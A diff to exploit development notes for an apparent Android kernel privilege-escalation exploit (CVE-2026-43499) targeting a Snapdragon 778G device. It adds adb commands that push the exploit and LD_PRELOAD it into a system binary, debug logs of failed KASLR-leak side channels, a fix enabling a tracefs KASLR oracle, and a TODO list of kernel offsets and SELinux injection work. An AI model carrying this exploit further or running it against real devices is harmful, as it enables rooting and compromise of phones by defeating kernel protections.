@@ -151,16 +151,63 @@ adb shell su -c "getenforce"
 
 ---
 
+## On-device test results (October 2026)
+
+### Run 1 — Correct invocation via LD_PRELOAD
+
+```bash
+adb push cve-2026-43499-app.so cve-2026-43499 /data/local/tmp/
+adb shell chmod +x /data/local/tmp/cve-2026-43499
+adb shell "cd /data/local/tmp && LD_PRELOAD=./cve-2026-43499-app.so /system/bin/id \
+  >/data/local/tmp/xploit_run.log 2>&1 &"
+```
+
+**Note:** `cve-2026-43499` is a shared object (not an executable).  Must be LD_PRELOADed
+into a real system binary — running it directly causes SIGSEGV.
+
+### Failure chain (build prior to APP_TRACEFS_SLIDE fix)
+
+```
+[+] p0 profile pid=25153 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000
+    delta=0000000028000000 slide_logger=ffffff8032595de0 bootid_data=ffffff8032eb39d0
+    init_task=ffffff8032e43e80 root_tg=ffffff803306cde0 sysctl_bootid=ffffff80332a9de1
+[-] slide bad leaked pointer=3e45e337c49fa403          ← boot_id oracle: fails on fresh device (expected)
+[-] KernelSnitch mm_struct leak failed                  ← timing side-channel unreliable on SM7325
+[*] kernel page prepare mode=1 attempt=1/2 elapsed_ms=7432 base=0000000000000000
+[-] prepare_kernel_page retry 1/2
+[-] KernelSnitch mm_struct leak failed
+[*] kernel page prepare mode=1 attempt=2/2 elapsed_ms=4734 base=0000000000000000
+[-] prepare_kernel_page retry 2/2
+[-] prepare_kernel_page did not find usable nonzero source pointers
+[!] slide kaslr leak failed
+```
+
+The p0 profile virtual addresses are **correct** (delta=0x28000000 matches
+`P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET = 0xa8000000 - 0x80000000`).
+
+Root cause: KernelSnitch futex-timing side-channel does not reliably detect
+mm_struct reuse on the Snapdragon 778G under Android 16.  The a73x target was
+missing `APP_TRACEFS_SLIDE 1`, which all other non-MTE targets use as the
+primary KASLR oracle.
+
+**Fix (commit 1638fb8):** Added `APP_TRACEFS_SLIDE 1` to the `APP_PAYLOAD` block.
+Event ID 73 confirmed on device:
+```bash
+adb shell cat /sys/kernel/tracing/events/sched/sched_blocked_reason/id
+# 73  ← matches SLIDE_TRACEFS_EVENT_ID
+```
+
 ## Known issues / TODO
 
 | # | Issue | Severity | Notes |
 |---|---|---|---|
-| 1 | `SLIDE_TRACEFS_EVENT_ID = 73` unverified | High | Verify with `adb shell cat /sys/kernel/tracing/events/sched/sched_blocked_reason/id` |
-| 2 | `SYSCTL_BOOTID_OFF = 0x0b2a9de1` odd alignment | Medium | Ends in an odd byte — unusual for a data symbol. Cross-check with `vmlinux.nm` or a crash log showing `boot_id` |
-| 3 | `KIMAGE_TEXT_BASE = 0xffffffc008000000` unverified | Medium | Standard unslid base for QGKI 5.4. Confirm via `/proc/kallsyms _stext` on a reference device |
-| 4 | SELinux rule injection is a no-op | Low | Device stays permissive after exploit.  A proper 5.4 SELinux port is a follow-up task |
-| 5 | `copy_from/to_user_nofault` shim uses sleepable `copy_from_user` | Low | Loses "nofault" semantics; may panic if called in atomic/interrupt context.  In practice KernelSU uses these only in task context |
-| 6 | No on-device test of the `.ko` | — | Module compiled but never loaded on real hardware yet |
+| 1 | `SLIDE_TRACEFS_EVENT_ID = 73` **verified** ✓ | — | Confirmed on device |
+| 2 | `SLIDE_TRACEFS_WORKER_CALLER_OFF = 0x0834ef7c` unverified | High | This is the function the tracefs oracle expects in the blocking I/O path. If KASLR leak still fails after APP_TRACEFS_SLIDE, check "slide tracefs raw caller=" log lines to find the real offset |
+| 3 | `SYSCTL_BOOTID_OFF = 0x0b2a9de1` odd alignment | Medium | Ends in an odd byte — unusual for a data symbol. Cross-check with `vmlinux.nm` or a crash log showing `boot_id` |
+| 4 | `KIMAGE_TEXT_BASE = 0xffffffc008000000` unverified | Medium | Standard unslid base for QGKI 5.4. Confirm via `/proc/kallsyms _stext` on a reference device |
+| 5 | SELinux rule injection is a no-op | Low | Device stays permissive after exploit.  A proper 5.4 SELinux port is a follow-up task |
+| 6 | `copy_from/to_user_nofault` shim uses sleepable `copy_from_user` | Low | Loses "nofault" semantics; may panic if called in atomic/interrupt context.  In practice KernelSU uses these only in task context |
+| 7 | No on-device test of the `.ko` | — | Module compiled but never loaded on real hardware yet |
 
 ---
 
